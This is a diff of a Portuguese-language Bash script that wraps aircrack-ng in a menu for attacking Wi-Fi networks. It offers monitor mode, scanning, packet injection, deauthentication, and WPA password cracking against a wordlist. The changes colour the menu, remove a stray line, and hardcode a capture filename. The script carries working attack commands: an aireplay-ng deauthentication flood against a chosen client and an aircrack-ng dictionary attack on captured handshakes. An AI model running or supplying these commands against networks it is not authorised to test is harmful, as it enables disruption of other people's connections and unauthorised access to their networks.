@@ -15,12 +15,12 @@ WORD_LIST="/home/joao_lucas/Desktop/Wordlists/wpa.list"
 
 menu(){
 	echo "##=================salvando em: $ARQ_CAP-01.cap==================##"
-	echo "1. Ativar modo monitoramento" 
-	echo "2. Scannear redes encontradas"
-	echo "3. Injetar pacotes"
-	echo "4. Fazer deauth"
-        echo "5. Quebrar senha"
-	echo "99. Sair"
+	echo -e " \033[1;34m 1.\033[0m Ativar modo monitoramento" 
+	echo -e " \033[1;34m 2.\033[0m Scannear redes encontradas"
+	echo -e " \033[1;34m 3.\033[0m Injetar pacotes"
+	echo -e " \033[1;34m 4.\033[0m Fazer deauth"
+        echo -e " \033[1;34m 5.\033[0m Quebrar senha"
+	echo -e " \033[1;34m 99.\033[0m Sair"
 	read -p "> Opção: " opt
 
 	case $opt in
@@ -92,7 +92,6 @@ injetar_pacotes(){
         read -p "> Informe o mac de um cliente: " client
         aireplay-ng -0 50 -a $BSSID -c $client $INTERFACE_MON
 	if [ $? -eq 0 ]
-                m
 	then
                 echo -e "\n [\033[0;32m OK\033[0m ] Pacotes injetados!"
 		menu
@@ -106,7 +105,7 @@ injetar_pacotes(){
 TENTAR_quebrar_senha(){
         #A senha da rede que você esta tentanto quebrar deve estar na sua wordlist"
         sleep 3 
-        aircrack-ng -w $WORD_LIST $ARQ_CAP
+        aircrack-ng -w $WORD_LIST arq_20-07-2016-14-14-01.cap
         if [ $? -eq 0 ]
         then
                echo -e "\n [\033[0;32m OK\033[0m ] Senha quebrada com sucesso!"
